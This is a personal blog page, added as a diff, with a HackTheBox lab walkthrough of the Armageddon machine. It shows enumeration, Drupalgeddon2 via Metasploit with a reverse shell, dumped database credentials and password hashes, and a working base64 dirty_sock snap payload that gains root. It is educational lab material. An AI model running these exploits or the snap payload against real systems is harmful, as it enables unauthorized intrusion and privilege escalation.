@@ -1,0 +1,338 @@
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Armageddon HackTheBox Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.86.0">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<p><span>July 25, 2021</span> by <span>Nasef</span></p>
+<h2 class=blog-title>Armageddon HackTheBox Walkthrough</h2>
+<img class=feature-image src=https://iamnasef.com/images/blog/011/featured-image.png alt=blog-feature-image>
+<p>Hello everybody !
+I am Nasef and today I am going to show you how I hacked Armageddon machine from hack the box, so let&rsquo;s get started !</p>
+<h2 id=services-enumeration>Services Enumeration</h2>
+<p>Nmap found ports ssh(22) and http (80) open which isn&rsquo;t interesting in itself.</p>
+<pre><code>nmap -sC -sV 10.10.10.233
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 13:14 EDT
+Nmap scan report for armageddon.htb (10.10.10.233)
+Host is up (0.17s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
+
+
+</code></pre><p>I ran another nmap scan -sU for enumerating udp services and found five filtered ports, I may look into them.</p>
+<pre><code>map -sU 10.10.10.233
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 13:17 EDT
+Nmap scan report for armageddon.htb (10.10.10.233)
+Host is up (0.17s latency).
+Not shown: 995 closed ports
+PORT      STATE         SERVICE
+217/udp   filtered      dbase
+1419/udp  filtered      timbuktu-srv3
+16433/udp filtered      unknown
+20762/udp open|filtered unknown
+41081/udp open|filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1121.05 seconds
+
+
+</code></pre><p>I ran another nmap scan -p- for enumerating the non-default ports but it gave me nothing new.</p>
+<pre><code>nmap -p- 10.10.10.233                                                                                                                                                                                                            130 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 13:17 EDT
+Nmap scan report for armageddon.htb (10.10.10.233)
+Host is up (0.17s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 723.00 seconds
+
+
+</code></pre><p>This concludes the service enumeration phase.</p>
+<h2 id=exploiting-http-service>Exploiting HTTP Service</h2>
+<p>Using the current information I decided to further enumerate the http service, but first I added the hostname of the machine in /etc/hosts because some machines use host routing.</p>
+<p>Then I ran gobuster to enumerate hidden directories, which gave me some files, maybe for a CMS?.</p>
+<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://armageddon.htb/ -x php,txt,git
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://armageddon.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,git
+[+] Timeout:                 10s
+===============================================================
+2021/06/24 13:15:41 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 7480]
+/misc                 (Status: 301) [Size: 235] [--&gt; http://armageddon.htb/misc/]
+/themes               (Status: 301) [Size: 237] [--&gt; http://armageddon.htb/themes/]
+/modules              (Status: 301) [Size: 238] [--&gt; http://armageddon.htb/modules/]
+/scripts              (Status: 301) [Size: 238] [--&gt; http://armageddon.htb/scripts/]
+/sites                (Status: 301) [Size: 236] [--&gt; http://armageddon.htb/sites/]  
+/includes             (Status: 301) [Size: 239] [--&gt; http://armageddon.htb/includes/]
+/install.php          (Status: 200) [Size: 3206]                                     
+/profiles             (Status: 301) [Size: 239] [--&gt; http://armageddon.htb/profiles/]
+/update.php           (Status: 403) [Size: 4087]                                     
+/README.txt           (Status: 200) [Size: 5382]                                     
+/shell.php            (Status: 200) [Size: 0]                                        
+/robots.txt           (Status: 200) [Size: 2189]                                     
+/cron.php             (Status: 403) [Size: 7428]                                     
+/INSTALL.txt          (Status: 200) [Size: 17995]                                    
+/LICENSE.txt          (Status: 200) [Size: 18092]                                    
+/CHANGELOG.txt        (Status: 200) [Size: 111613]           
+===============================================================
+2021/06/24 12:29:30 Finished
+===============================================================
+
+</code></pre><p>I opened the Armageddon.htb and used wappalyzer addon which told me that this website is running an outdated drupal CMS</p>
+<p><img src=/images/blog/011/1.png alt=image></p>
+<p>I found an exploit in metsaploit which has the name &ldquo;Drubalgeddon&rdquo;! using this exploit I got the initial foothold</p>
+<pre><code>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.14.23:4444 
+[*] Sending stage (39282 bytes) to 10.10.10.233
+[*] Meterpreter session 2 opened (10.10.14.23:4444 -&gt; 10.10.10.233:54426) at 2021-06-24 13:45:18 -0400
+
+</code></pre><h2 id=getting-user-shell>Getting User Shell</h2>
+<p>Unfortunately, the user apache has a restricted shell. Enumerating further, I found MySQL credentials in Drupal settings file &ldquo;sites/default/settings.php&rdquo;</p>
+<pre><code>$databases = array (
+  'default' =&gt; 
+  array (
+    'default' =&gt; 
+    array (
+      'database' =&gt; 'drupal',
+      'username' =&gt; 'drupaluser',
+      'password' =&gt; 'CQHEy@9M*m23gBVj',
+      'host' =&gt; 'localhost',
+      'port' =&gt; '',
+      'driver' =&gt; 'mysql',
+      'prefix' =&gt; '',
+    ),
+  ),
+);
+</code></pre><p>using the credentials I was able to find password hash of three users</p>
+<pre><code>mysql -u drupaluser -D drupal -p -e &quot;show tables;&quot;
+Enter password: CQHEy@9M*m23gBVj
+Tables_in_drupal
+...
+users
+...
+mysql -u drupaluser -D drupal -p -e &quot;SELECT * FROM users&quot;
+Enter password: CQHEy@9M*m23gBVj
+uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone  language        picture init    data
+0                                               NULL    0       0       0       0       NULL            0        NULL
+1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu      filtered_html    1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu       a:1:{s:7:&quot;overlay&quot;;i:1;}
+3       EzMunySniper    $S$DPfz8yV0G.kOh9yV9UKwZ/MP9pLlnIPAUFoznjkUX5v6ouH9xiH2 rockylab828@gmail.com            filtered_html    1624550527      0       0       0       Europe/London           0       rockylab828@gmail.com   NULL
+
+
+</code></pre><p>I cated &ldquo;/etc/passwd&rdquo; to see the available users and found user &ldquo;brucetherealadmin&rdquo; which also we found in MySQL dump. I cracked the hash using john and sshd into it.</p>
+<pre><code>john hash --show
+?:booboo
+
+1 password hash cracked, 0 left
+
+ssh brucetherealadmin@10.10.10.233                                                                      
+brucetherealadmin@10.10.10.233's password: 
+Last failed login: Thu Jun 24 18:37:48 BST 2021 from 10.10.14.23 on ssh:notty
+There was 1 failed login attempt since the last successful login.
+Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
+[brucetherealadmin@armageddon ~]$ 
+
+</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
+<p>Before running any heavy privesc scripts, I prefer going through my manual checklist. Starting with sudo, I found that I can run the /usr/bin/snap binary as root without password</p>
+<pre><code>sudo -l
+Matching Defaults entries for brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,
+    env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+
+</code></pre><p>I went straight into gtfio bins and tried the listed exploits but they didn&rsquo;t work.</p>
+<p><img src=/images/blog/011/2.png alt=image></p>
+<p>Using google I found an exploit called dirty sock.</p>
+<pre><code>https://github.com/initstring/dirty_sock
+</code></pre><p>Somehow the automated script didn&rsquo;t work. Doing the exploit manually I was able to make user with unlimited sudo permissions as a root called dirty_sock. I sudoed into /bin/bash to have root shell</p>
+<pre><code>[brucetherealadmin@armageddon tmp]$ python2 -c &quot;print '''aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''+ 'A' * 4256 + '=='&quot; | base64 -d &gt; hello.snap
+[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --devmode hello.snap
+dirty-sock 0.1 installed
+[brucetherealadmin@armageddon tmp]$ su dirty_sock
+Password: 
+[dirty_sock@armageddon tmp]$ whoami
+dirty_sock
+[dirty_sock@armageddon tmp]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for dirty_sock: 
+Matching Defaults entries for dirty_sock on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS
+    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+    LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User dirty_sock may run the following commands on armageddon:
+    (ALL : ALL) ALL
+[dirty_sock@armageddon tmp]$ sudo /bin/bash
+[root@armageddon tmp]# whoami
+root
+[root@armageddon tmp]# cat /root/root.txt 
+4e6361b15a8819622de11d2c6bebd604
+
+</code></pre><p>Thank you for reading!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
